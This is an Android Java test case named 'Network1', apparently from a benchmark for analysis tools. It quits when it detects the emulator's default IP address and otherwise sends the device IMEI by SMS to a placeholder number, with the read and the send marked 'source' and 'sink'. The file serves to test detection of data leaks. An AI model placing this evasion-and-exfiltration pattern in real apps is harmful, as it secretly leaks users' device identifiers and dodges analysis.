
package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
/**
 * @testcase_name Network1
 * Copied from http://stackoverflow.com/a/13007325
 * The practical attack: 
 *    - maybe? ./319_DroidKungFu4-ca3c18fa9e7d402d57a3f2138b1d68754de65c86/b.java:619
 */
public class Network1 extends Activity {
	
	@Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d("IBM", "start");
        setContentView(R.layout.network1);
        /*
        WifiManager wm = (WifiManager) getSystemService(WIFI_SERVICE);
        @SuppressWarnings("deprecation")
		String ip = Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
        Log.d("IBM", "IP: "+ip);
        */
		String wlanMAC = Utils.getMACAddress("wlan0");
		String eth0MAC = Utils.getMACAddress("eth0");
		String IPv4    = Utils.getIPAddress(true);
		String IPv6    = Utils.getIPAddress(false);
        
        Log.d("IBM","wlanMAC: "+wlanMAC);
        Log.d("IBM","eth0MAC: "+eth0MAC);
        Log.d("IBM","IPv4: "   +IPv4   ); // IPv4
        Log.d("IBM","IPv6: "   +IPv6   ); // IPv6 
        
        if (IPv4.equals("10.0.2.15")) {
        	System.exit(0);
        	return;
        }
        
        String imei = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source

    	SmsManager sms = SmsManager.getDefault();
		Log.d("IBM", "sending SMS: "+imei);
		sms.sendTextMessage("+49 1234", null, imei, null, null);  //sink
		Log.d("IBM", "end");
    }
}
